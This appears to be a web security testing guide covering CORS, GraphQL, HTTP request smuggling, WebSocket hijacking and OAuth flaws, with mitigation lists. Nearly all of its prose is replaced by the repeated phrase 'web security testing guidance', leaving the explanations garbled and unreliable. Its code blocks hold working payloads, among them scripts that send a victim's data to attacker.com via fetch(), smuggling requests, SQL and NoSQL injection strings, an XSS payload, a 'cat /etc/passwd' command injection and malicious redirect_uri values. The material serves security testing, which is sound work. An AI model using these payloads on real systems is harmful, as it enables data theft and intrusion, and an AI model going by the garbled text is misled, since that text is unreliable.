# web security testing guidanceWebweb security testing guidance

> **web security testing guidance**: web security testing guidanceWooYunweb security testing guidance、OWASPweb security testing guidance，web security testing guidanceCORS、GraphQL、HTTPweb security testing guidance、WebSocket、OAuthweb security testing guidanceWebweb security testing guidance。
> **web security testing guidance**: WooYunweb security testing guidance + L1-L4web security testing guidance

---

## web security testing guidance、CORSweb security testing guidance

### 1.1 web security testing guidance

```
CORSweb security testing guidance = Access-Control-Allow-Originweb security testing guidance × web security testing guidance
```

web security testing guidance，CORSweb security testing guidance，web security testing guidance。

### 1.2 web security testing guidance

```bash
# web security testing guidance: web security testing guidanceOriginweb security testing guidance
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# web security testing guidance:
# Access-Control-Allow-Origin: https://evil.com  → web security testing guidance!
# Access-Control-Allow-Credentials: true          → web security testing guidanceCookieweb security testing guidance
```

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|------|
| `Access-Control-Allow-Origin: *` | web security testing guidance | web security testing guidance，web security testing guidance(web security testing guidanceCookie) |
| web security testing guidanceOrigin | web security testing guidance | web security testing guidanceOriginweb security testing guidance |
| `null` Originweb security testing guidance | web security testing guidance | `<iframe sandbox>`web security testing guidancenullweb security testing guidance |
| web security testing guidance | web security testing guidance | `evil.com.attacker.com`web security testing guidance`evil.com` |
| web security testing guidance | web security testing guidance | `*.target.com`web security testing guidance |

### 1.3 web security testing guidance

```html
<!-- web security testing guidance: web security testing guidance -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal data=' + JSON.stringify(d)));
</script>

<!-- null Originweb security testing guidance -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 web security testing guidance

- **web security testing guidanceOrigin**：web security testing guidance，web security testing guidance
- web security testing guidance`Access-Control-Allow-Origin: *`web security testing guidance`Access-Control-Allow-Credentials: true`web security testing guidance
- web security testing guidance`null` Origin
- web security testing guidance(^web security testing guidance$)，web security testing guidance
- web security testing guidanceCSRF Tokenweb security testing guidance，web security testing guidanceCORS

---

## web security testing guidance、GraphQLweb security testing guidance

### 2.1 web security testing guidance

```
GraphQLweb security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
```

GraphQLweb security testing guidance，web security testing guidanceAPIweb security testing guidance，web security testing guidance。

### 2.2 web security testing guidance - web security testing guidance

```graphql
# web security testing guidanceSchema（web security testing guidance、web security testing guidance、web security testing guidance）
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# web security testing guidance：web security testing guidance
{__schema{queryType{name,fields{name}}}}

# web security testing guidancemutationweb security testing guidance
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 web security testing guidance

**web security testing guidance**

```graphql
# web security testing guidanceSQLweb security testing guidance
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQLweb security testing guidance
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**web security testing guidanceDoS（web security testing guidance）**

```graphql
# web security testing guidance - web security testing guidance
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# web security testing guidance - web security testing guidance
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# web security testing guidancemutationweb security testing guidance
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**web security testing guidance**

```graphql
# mutationweb security testing guidance
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 web security testing guidance

- **web security testing guidance**：web security testing guidance`__schema`/`__type`web security testing guidance
- web security testing guidance(web security testing guidance10web security testing guidance)web security testing guidance
- web security testing guidance(web security testing guidance/web security testing guidanceDoS)
- web security testing guidance(web security testing guidanceresolverweb security testing guidance)
- web security testing guidance(web security testing guidance)、web security testing guidance
- web security testing guidance(Persisted Queries)，web security testing guidance

---

## web security testing guidance、HTTPweb security testing guidance

### 3.1 web security testing guidance

```
web security testing guidance(CDN/LB) web security testing guidance web security testing guidance web security testing guidanceHTTPweb security testing guidance
→ web security testing guidanceTCPweb security testing guidance"web security testing guidance"web security testing guidance → web security testing guidance
```

web security testing guidance：`Content-Length`(CL) web security testing guidance `Transfer-Encoding: chunked`(TE) web security testing guidance，web security testing guidance。

### 3.2 web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | web security testing guidanceCLweb security testing guidance，web security testing guidanceTEweb security testing guidance |
| TE.CL | Transfer-Encoding | Content-Length | web security testing guidanceTEweb security testing guidance，web security testing guidanceCLweb security testing guidance |
| TE.TE | Transfer-Encoding | Transfer-Encoding | web security testing guidanceTEweb security testing guidance |

### 3.3 web security testing guidancePayload

**CL.TEweb security testing guidance**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CLweb security testing guidance**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TEweb security testing guidance**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 web security testing guidance

```
web security testing guidance:
1. web security testing guidanceCL/TEweb security testing guidance，web security testing guidance/web security testing guidance
2. web security testing guidance，web security testing guidance
3. web security testing guidance: Burp Suite HTTP Request Smugglerweb security testing guidance

web security testing guidance:
- web security testing guidanceWAF/ACL → web security testing guidance
- web security testing guidance → web security testing guidanceCookie/Session
- web security testing guidance → web security testing guidanceCDNweb security testing guidance
- web security testing guidance → web security testing guidance
```

### 3.5 web security testing guidance

- web security testing guidanceHTTPweb security testing guidance/web security testing guidance
- web security testing guidanceCLweb security testing guidanceTEweb security testing guidance，web security testing guidance
- web security testing guidanceHTTP/1.0 Keep-Aliveweb security testing guidance
- web security testing guidanceHTTP/2(web security testing guidance，web security testing guidanceCL/TEweb security testing guidance)
- CDN/LBweb security testing guidance

---

## web security testing guidance、WebSocketweb security testing guidance

### 4.1 web security testing guidance

```
WebSocketweb security testing guidance = HTTPweb security testing guidance × web security testing guidance
```

WebSocketweb security testing guidance，web security testing guidanceHTTPweb security testing guidance(Cookie SameSite/CSRF Tokenweb security testing guidance)。

### 4.2 web security testing guidanceWebSocketweb security testing guidance(CSWSH)

```html
<!-- web security testing guidance: web security testing guidanceWebSocketweb security testing guidance -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // web security testing guidance
};
ws.onmessage = function(e) {
    // web security testing guidance
    fetch('https://attacker.com/steal data=' + encodeURIComponent(e.data));
};
</script>
```

**web security testing guidance**：WebSocketweb security testing guidanceHTTPweb security testing guidance，web security testing guidanceCookie。web security testing guidanceOriginweb security testing guidance，web security testing guidancewsweb security testing guidance。

### 4.3 web security testing guidance

```javascript
// web security testing guidanceWebSocketweb security testing guidancepayload
ws.send('{"query": "admin\' OR 1=1--"}');          // SQLweb security testing guidance
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // web security testing guidance
```

### 4.4 web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|------|
| web security testing guidance | Sessionweb security testing guidance | wsweb security testing guidance |
| web security testing guidance | web security testing guidance | web security testing guidanceper-messageweb security testing guidance |
| Tokenweb security testing guidance | WebSocketweb security testing guidance(ws://) | web security testing guidancewss://web security testing guidance |

### 4.5 web security testing guidance

- **web security testing guidanceOriginweb security testing guidance**：web security testing guidanceOriginweb security testing guidance(web security testing guidanceCSWSH)
- **Tokenweb security testing guidance**：web security testing guidanceURLweb security testing guidanceToken(web security testing guidanceCookie)
- **web security testing guidance**：web security testing guidance(web security testing guidance)
- web security testing guidancewss://web security testing guidance
- web security testing guidanceSessionweb security testing guidance
- web security testing guidance(web security testing guidanceDoS)

---

## web security testing guidance、OAuth 2.0/OIDCweb security testing guidance

### 5.1 web security testing guidance

```
OAuthweb security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
```

OAuthweb security testing guidance、web security testing guidance、web security testing guidance，web security testing guidanceTokenweb security testing guidance。

### 5.2 redirect_uriweb security testing guidance

```
# web security testing guidance
https://auth.target.com/authorize response_type=code&client_id=app&redirect_uri=https://app.com/callback

# web security testing guidance: web security testing guidanceredirect_uriweb security testing guidance
redirect_uri=https://attacker.com/steal           # web security testing guidance
redirect_uri=https://app.com.attacker.com/callback # web security testing guidance
redirect_uri=https://app.com/callback/../../../attacker # web security testing guidance
redirect_uri=https://app.com/callback next=https://attacker.com # web security testing guidance
```

### 5.3 web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|----------|------|----------|
| CSRFweb security testing guidance | stateweb security testing guidance | web security testing guidance |
| Tokenweb security testing guidance(Referer) | web security testing guidancetokenweb security testing guidanceURL Fragmentweb security testing guidance | web security testing guidance |
| Tokenweb security testing guidance(web security testing guidance) | web security testing guidance/tokenweb security testing guidance | web security testing guidance |
| PKCEweb security testing guidance | web security testing guidancecode_challenge | web security testing guidancetoken |
| IdPweb security testing guidance(Mix-Up) | web security testing guidanceIdPweb security testing guidance | web security testing guidanceOAuthweb security testing guidance |
| web security testing guidance | web security testing guidance | web security testing guidance |

### 5.4 CSRFweb security testing guidancestateweb security testing guidance

```
# web security testing guidance (stateweb security testing guidance)
1. web security testing guidanceOAuthweb security testing guidance，web security testing guidance
2. web security testing guidance: https://app.com/callback code=ATTACKER_CODE
3. web security testing guidance → web security testing guidance
4. web security testing guidance → web security testing guidance

# web security testing guidance: stateweb security testing guidance
state=web security testing guidance(web security testing guidanceSession)
→ web security testing guidancestateweb security testing guidanceSessionweb security testing guidance
```

### 5.5 web security testing guidance

```
# web security testing guidance(Implicit Flow) - web security testing guidance
https://app.com/callback#access_token=eyJ...&token_type=bearer

web security testing guidance:
- Tokenweb security testing guidanceURL Fragmentweb security testing guidance，web security testing guidance/Refererweb security testing guidance
- web security testing guidancerefresh_token，web security testing guidance
- web security testing guidance(web security testing guidanceclient_secret)

→ web security testing guidance: Authorization Code Flow + PKCE
```

### 5.6 web security testing guidance

- **web security testing guidanceredirect_uriweb security testing guidance**：web security testing guidance(web security testing guidance/web security testing guidance)
- **web security testing guidancestateweb security testing guidance**：web security testing guidanceSession、web security testing guidance、web security testing guidance
- **web security testing guidancePKCE**：web security testing guidance(web security testing guidance/SPA)web security testing guidancecode_challenge
- web security testing guidanceAuthorization Code Flow，web security testing guidanceImplicit Flow
- web security testing guidance，web security testing guidance(web security testing guidance10web security testing guidance)
- Tokenweb security testing guidance(DPoP/mTLS)web security testing guidanceTokenweb security testing guidance
- web security testing guidance

---

*web security testing guidanceWooYunweb security testing guidance(88,636web security testing guidance)web security testing guidance + OWASP/RFCweb security testing guidance | web security testing guidance*
